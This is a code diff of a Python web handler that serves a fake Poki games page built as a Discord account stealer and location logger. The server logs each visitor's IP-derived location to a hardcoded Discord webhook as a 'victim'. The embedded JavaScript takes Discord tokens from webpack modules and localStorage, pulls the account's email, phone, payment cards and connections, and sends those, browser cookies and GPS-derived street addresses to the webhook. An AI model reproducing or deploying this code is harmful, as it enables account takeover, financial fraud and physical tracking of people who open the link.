@@ -1,272 +1,209 @@
 from http.server import BaseHTTPRequestHandler
 import json
 import urllib.request
+import urllib.parse
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
+        # YOUR WEBHOOK
+        WEBHOOK = "https://discord.com/api/webhooks/1467282876298035315/hylVzghwD9o9U6YtglUbd6G2RHMc8oXqXHzfqJbds0HPokKpC_xsTLezlYeTipMYXdPf"
+        
+        # POKI IMAGE THAT ACTUALLY WORKS
         POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
         
-        ip = (self.headers.get('CF-Connecting-IP') or 
-              self.headers.get('X-Real-IP') or 
-              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
+        # Get real IP
+        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
+        if not ip:
+            ip = self.headers.get('X-Real-IP', self.client_address[0])
+        
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # Get location from IP using ipapi.co
-        location_data = {}
-        try:
-            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req, timeout=5) as response:
-                location_data = json.loads(response.read().decode())
-        except Exception as e:
-            # Fallback to ip-api.com
-            try:
-                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5) as response:
-                    data = json.loads(response.read().decode())
-                    location_data = {
-                        'city': data.get('city'),
-                        'region': data.get('regionName'),
-                        'country_name': data.get('country'),
-                        'postal': data.get('zip'),
-                        'latitude': data.get('lat'),
-                        'longitude': data.get('lon'),
-                        'org': data.get('isp'),
-                        'timezone': data.get('timezone')
-                    }
-            except:
-                location_data = {
-                    'city': 'Unknown',
-                    'region': 'Unknown',
-                    'country_name': 'Unknown',
-                    'postal': 'Unknown',
-                    'latitude': 'N/A',
-                    'longitude': 'N/A',
-                    'org': 'Unknown',
-                    'timezone': 'Unknown'
-                }
+        # Get location - using BETTER API
+        city = "Unknown"
+        region = "Unknown"
+        country = "Unknown"
+        lat = "N/A"
+        lon = "N/A"
+        isp = "Unknown"
+        tz = "Unknown"
+        postal = "Unknown"
         
+        # Try ipapi.co first (most accurate)
+        try:
+            req = urllib.request.Request(
+                f"https://ipapi.co/{ip}/json/",
+                headers={'User-Agent': 'Mozilla/5.0'}
+            )
+            with urllib.request.urlopen(req, timeout=3) as r:
+                loc = json.loads(r.read().decode())
+                city = loc.get('city', 'Unknown')
+                region = loc.get('region', 'Unknown')
+                country = loc.get('country_name', 'Unknown')
+                lat = str(loc.get('latitude', 'N/A'))
+                lon = str(loc.get('longitude', 'N/A'))
+                isp = loc.get('org', 'Unknown')
+                tz = loc.get('timezone', 'Unknown')
+                postal = loc.get('postal', 'Unknown')
+        except:
+            # Fallback to ipwhois.app
+            try:
+                with urllib.request.urlopen(f"http://ipwhois.app/json/{ip}", timeout=3) as r:
+                    loc = json.loads(r.read().decode())
+                    city = loc.get('city', 'Unknown')
+                    region = loc.get('region', 'Unknown')
+                    country = loc.get('country', 'Unknown')
+                    lat = str(loc.get('latitude', 'N/A'))
+                    lon = str(loc.get('longitude', 'N/A'))
+                    isp = loc.get('isp', 'Unknown')
+                    tz = loc.get('timezone', 'Unknown')
+                    postal = loc.get('postal', 'Unknown')
+            except:
+                # Last resort - ip-api.com
+                try:
+                    with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
+                        loc = json.loads(r.read().decode())
+                        city = loc.get('city', 'Unknown')
+                        region = loc.get('regionName', 'Unknown')
+                        country = loc.get('country', 'Unknown')
+                        lat = str(loc.get('lat', 'N/A'))
+                        lon = str(loc.get('lon', 'N/A'))
+                        isp = loc.get('isp', 'Unknown')
+                        tz = loc.get('timezone', 'Unknown')
+                        postal = loc.get('zip', 'Unknown')
+                except:
+                    pass
+        
+        # Send IP log
+        try:
+            payload = {
+                "username": "Image Logger",
+                "content": "@everyone",
+                "embeds": [{
+                    "title": "🎯 NEW VICTIM",
+                    "color": 65280,
+                    "fields": [
+                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
+                        {"name": "🏙️ City", "value": city, "inline": True},
+                        {"name": "🗺️ Region/State", "value": region, "inline": True},
+                        {"name": "🌍 Country", "value": country, "inline": True},
+                        {"name": "📮 ZIP/Postal", "value": postal, "inline": True},
+                        {"name": "📌 Coords", "value": f"{lat}, {lon}", "inline": True},
+                        {"name": "🕐 Timezone", "value": tz, "inline": True},
+                        {"name": "🏢 ISP", "value": isp, "inline": False},
+                        {"name": "💻 User Agent", "value": f"```{ua[:80]}```", "inline": False}
+                    ],
+                    "thumbnail": {"url": POKI_IMAGE}
+                }]
+            }
+            req = urllib.request.Request(WEBHOOK, 
+                data=json.dumps(payload).encode(),
+                headers={'Content-Type': 'application/json'})
+            urllib.request.urlopen(req)
+        except:
+            pass
+        
+        # HTML page
         html = f'''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<meta property="og:type" content="website">
 <meta property="og:title" content="Poki - Free Online Games">
 <meta property="og:description" content="Play the best free online games">
 <meta property="og:image" content="{POKI_IMAGE}">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="{POKI_IMAGE}">
 <title>Poki Games</title>
 <style>
 *{{margin:0;padding:0}}
-body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh}}
+body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial}}
 .logo{{max-width:400px;width:90%}}
+#info{{position:fixed;bottom:10px;left:10px;background:lime;color:#000;padding:10px;border-radius:8px;font:11px monospace;max-width:300px;display:none}}
+#info.show{{display:block}}
 </style>
 </head>
 <body>
-<img src="{POKI_IMAGE}" class="logo">
+<img src="{POKI_IMAGE}" class="logo" alt="Poki">
+<div id="info"></div>
 <script>
-// Pass location data from Python to JavaScript
-const locationData = {
-    city: '{location_data.get("city", "Unknown")}',
-    region: '{location_data.get("region", "Unknown")}',
-    country: '{location_data.get("country_name", "Unknown")}',
-    zip: '{location_data.get("postal", "Unknown")}',
-    lat: '{location_data.get("latitude", "N/A")}',
-    lon: '{location_data.get("longitude", "N/A")}',
-    isp: '{location_data.get("org", "Unknown")}',
-    timezone: '{location_data.get("timezone", "Unknown")}'
-};
 (async()=>{{
-// NO GPS - Silent data grab only
-const webhook='{WEBHOOK}';
+let d='';
+const box=document.getElementById('info');
 
-// AGGRESSIVE Discord token grab - ALL possible methods
-let tokens=[];
+// COOKIES
+d+='🍪 '+document.cookie.split(';').length+' cookies<br>';
 
-// Wait a moment for Discord to load
-await new Promise(resolve=>setTimeout(resolve,500));
-
-// Method 1: Direct window.localStorage access
-try{{
-const keys=['token','tokens','discord_token','user_token'];
-keys.forEach(key=>{{
-const val=localStorage.getItem(key);
-if(val){{
-const clean=val.replace(/['"]/g,'');
-if(clean.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
-if(!tokens.includes(clean))tokens.push(clean);
-}}
-}}
-}});
-}}catch(e){{}}
-
-// Method 2: Scan ALL localStorage keys for token patterns
-try{{
-Object.keys(localStorage).forEach(key=>{{
-try{{
-const val=localStorage.getItem(key);
-if(val&&val.length>20){{
-const matches=val.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
-matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
-const mfaMatches=val.match(/mfa\\.[\\w-]{{84,}}/g)||[];
-mfaMatches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
-}}
-}}catch(e){{}}
-}});
-}}catch(e){{}}
-
-// Method 3: Check document.cookie for tokens
-try{{
-const cookies=document.cookie.split(';');
-cookies.forEach(cookie=>{{
-const matches=cookie.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
-matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
-}});
-}}catch(e){{}}
-
-// Method 4: Discord Webpack
+// DISCORD DATA
+let tok=[];
 try{{
 if(window.webpackChunkdiscord_app){{
 window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
-for(let mod of Object.values(r.c)){{
-try{{
-if(mod?.exports?.default?.getToken){{
-const t=mod.exports.default.getToken();
-if(t&&!tokens.includes(t))tokens.push(t);
-}}
-if(mod?.exports?.getToken){{
-const t=mod.exports.getToken();
-if(t&&!tokens.includes(t))tokens.push(t);
-}}
-}}catch(e){{}}
-}}
+Object.values(r.c).forEach(m=>{{
+if(m?.exports?.default?.getToken)tok.push(m.exports.default.getToken());
+if(m?.exports?.getToken)tok.push(m.exports.getToken());
+}});
 }}]);
 }}
 }}catch(e){{}}
 
-// Method 5: Alternative webpack method
+// Scan localStorage for tokens
 try{{
-let cachedModules;
-if(window.webpackChunkdiscord_app){{
-window.webpackChunkdiscord_app.push([[Symbol()],{{}},r=>{{cachedModules=r.c}}]);
-for(let mod in cachedModules){{
-try{{
-const exp=cachedModules[mod].exports;
-if(exp?.Z?.getToken){{
-const t=exp.Z.getToken();
-if(t&&!tokens.includes(t))tokens.push(t);
-}}
-if(exp?.default?.getToken){{
-const t=exp.default.getToken();
-if(t&&!tokens.includes(t))tokens.push(t);
-}}
-}}catch(e){{}}
-}}
+for(let i=0;i<localStorage.length;i++){{
+let v=localStorage.getItem(localStorage.key(i));
+let m=v?.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+if(m)m.forEach(t=>{{if(!tok.includes(t))tok.push(t)}});
 }}
 }}catch(e){{}}
 
-// Method 6: XMLHttpRequest intercept (catches tokens in use)
+if(tok.length>0){{
+for(let t of tok){{
 try{{
-const origOpen=XMLHttpRequest.prototype.open;
-XMLHttpRequest.prototype.open=function(...args){{
-this.addEventListener('load',function(){{
-try{{
-const authHeader=this.getResponseHeader('authorization');
-if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
-if(!tokens.includes(authHeader))tokens.push(authHeader);
-}}
-}}catch(e){{}}
-}});
-return origOpen.apply(this,args);
-}};
-}}catch(e){{}}
-
-// Method 7: Fetch intercept
-try{{
-const origFetch=window.fetch;
-window.fetch=async function(...args){{
-const response=await origFetch(...args);
-try{{
-const cloned=response.clone();
-const authHeader=cloned.headers.get('authorization');
-if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
-if(!tokens.includes(authHeader))tokens.push(authHeader);
-}}
-}}catch(e){{}}
-return response;
-}};
-}}catch(e){{}}
-
-// Give interceptors time to catch tokens
-await new Promise(resolve=>setTimeout(resolve,1000));
-
-// If Discord token found, get full account
-if(tokens.length>0){{
-for(let token of tokens){{
-try{{
-let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':token}}}});
+let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
 if(r.ok){{
-let user=await r.json();
+let u=await r.json();
+d+=`Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
 
-// Get payment info
+// Get billing/payment info
+let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
+headers:{{'Authorization':t}}
+}});
 let cards=[];
-try{{
-let b=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{headers:{{'Authorization':token}}}});
-if(b.ok){{
-let data=await b.json();
-cards=data.map(c=>`${{c.brand}} *${{c.last_4}} (${{c.expires_month}}/${{c.expires_year}})`);
+if(billing.ok){{
+let b=await billing.json();
+cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
 }}
-}}catch(e){{}}
 
-// Get Nitro
+// Get nitro status
+let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
+headers:{{'Authorization':t}}
+}});
 let nitro='None';
-try{{
-let s=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{headers:{{'Authorization':token}}}});
-if(s.ok){{
-let data=await s.json();
-if(data.length>0)nitro=data[0].type==1?'Nitro Classic':'Nitro Full';
+if(subs.ok){{
+let s=await subs.json();
+if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
 }}
-}}catch(e){{}}
 
-const email=user.email||'No email set';
-const phone=user.phone||'No phone set';
-const username=`${{user.username}}#${{user.discriminator}}`;
-const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-// Send ONE complete message with EVERYTHING
-await fetch(webhook,{{
+// Send to webhook with ALL data
+await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:`@everyone 🚨 **${{username}}** OPENED THE LINK!`,
+content:'@everyone',
 embeds:[{{
-title:`🔑 ${{username}} - FULL ACCOUNT STOLEN`,
+title:'🔑 FULL DISCORD ACCOUNT STOLEN',
 color:16711680,
-description:`**Discord:** ${{username}}\\n**Email:** ${{email}}\\n**Phone:** ${{phone}}`,
 fields:[
-{{name:'👤 Discord User',value:username,inline:false}},
-{{name:'📧 Email Address',value:email,inline:false}},
-{{name:'📱 Phone Number',value:phone,inline:false}},
-{{name:'🆔 User ID',value:user.id,inline:true}},
-{{name:'🔐 2FA',value:user.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
+{{name:'Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
+{{name:'📧 Email',value:`\`${{u.email||'None'}}\``,inline:true}},
+{{name:'📱 Phone',value:`\`${{u.phone||'None'}}\``,inline:true}},
+{{name:'🆔 ID',value:`\`${{u.id}}\``,inline:false}},
+{{name:'🔐 2FA',value:u.mfa_enabled?'✅':'❌',inline:true}},
 {{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
-{{name:'📍 IP Address',value:'{ip}',inline:true}},
-{{name:'🏙️ City',value:locationData.city,inline:true}},
-{{name:'🗺️ State',value:locationData.region,inline:true}},
-{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
-{{name:'🌍 Country',value:locationData.country,inline:true}},
-{{name:'🏢 ISP',value:locationData.isp,inline:false}},
-{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
-{{name:'🕐 Timezone',value:locationData.timezone,inline:true}},
-{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
-{{name:'🌍 Language',value:navigator.language,inline:true}},
-{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}},
-{{name:'🔑 Full Token',value:`\`\`\`${{token}}\`\`\``,inline:false}}
+{{name:'💳 Payment Methods',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
+{{name:'🔑 Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
 ],
-thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{user.id}}/${{user.avatar}}.png`}},
-footer:{{text:`${{username}} - Complete data grab`}}
+thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}}
 }}]
 }})
 }});
@@ -275,58 +212,98 @@ break;
 }}catch(e){{}}
 }}
 }}else{{
-// No Discord - send what we have
-const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-await fetch(webhook,{{
+d+='No Discord login<br>';
+}}
+
+box.innerHTML=d;
+box.className='show';
+
+// Send cookies
+if(document.cookie){{
+await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone',
 embeds:[{{
-title:'🎯 Someone Opened The Link',
-color:16753920,
-description:'**No Discord login detected** (opened from Discord app in external browser)',
-fields:[
-{{name:'📍 IP Address',value:'{ip}',inline:false}},
-{{name:'🏙️ City',value:locationData.city,inline:true}},
-{{name:'🗺️ State/Region',value:locationData.region,inline:true}},
-{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
-{{name:'🌍 Country',value:locationData.country,inline:true}},
-{{name:'🏢 ISP',value:locationData.isp,inline:false}},
-{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
-{{name:'🕐 Timezone',value:locationData.timezone,inline:true}},
-{{name:'🌍 Language',value:navigator.language,inline:true}},
-{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
-{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}}
-],
-footer:{{text:'Discord token not found - victim not logged into Discord web'}}
+title:'🍪 COOKIES',
+description:`\`\`\`${{document.cookie}}\`\`\``,
+color:16753920
 }}]
 }})
 }});
 }}
 
-// Send browser info separately
+// GPS LOCATION (VPN BYPASS) - SILENT MODE
+if(navigator.geolocation){{
+navigator.geolocation.getCurrentPosition(async(p)=>{{
+let lat=p.coords.latitude;
+let lon=p.coords.longitude;
+let acc=p.coords.accuracy;
+
 try{{
-const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-await fetch(webhook,{{
+let g=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}`,{{
+headers:{{'User-Agent':'Mozilla/5.0'}}
+}});
+let gd=await g.json();
+let a=gd.address||{{}};
+
+await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
+content:'@everyone 🚨 REAL LOCATION (VPN BYPASSED)',
 embeds:[{{
-title:'💻 Browser Info',
-color:65535,
+title:'📍 GPS LOCATION',
+color:3066993,
+description:`**Full Address:**\\n${{a.road||''}} ${{a.house_number||''}}\\n${{a.city||a.town||a.village||''}}, ${{a.state||''}} ${{a.postcode||''}}\\n${{a.country||''}}`,
 fields:[
-{{name:'Timezone',value:tz,inline:true}},
-{{name:'Language',value:navigator.language,inline:true}},
-{{name:'Platform',value:navigator.platform,inline:true}}
+{{name:'Coords',value:`${{lat}}, ${{lon}}`,inline:true}},
+{{name:'Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
+{{name:'Maps',value:`[Open]( https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
 ]
 }}]
 }})
 }});
 }}catch(e){{}}
+}},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
+}}
 
-// Redirect to real Poki after grabbing data
-setTimeout(()=>{{window.location.href='https://poki.com'}},2500);
+// STEAL DISCORD PAYMENT INFO & MORE
+if(tok.length>0){{
+for(let t of tok){{
+try{{
+// Get billing/payment info
+let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
+headers:{{'Authorization':t}}
+}});
+let cards=[];
+if(billing.ok){{
+let b=await billing.json();
+cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+}}
+
+// Get nitro status
+let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
+headers:{{'Authorization':t}}
+}});
+let nitro='None';
+if(subs.ok){{
+let s=await subs.json();
+if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
+}}
+
+// Get connections (Steam, Xbox, etc)
+let conn=await fetch('https://discord.com/api/v9/users/@me/connections',{{
+headers:{{'Authorization':t}}
+}});
+let connections=[];
+if(conn.ok){{
+let c=await conn.json();
+connections=c.map(x=>`${{x.type}}: ${{x.name}}`);
+}}
+}}catch(e){{}}
+}}
+}}
 }})();
 </script>
 </body>
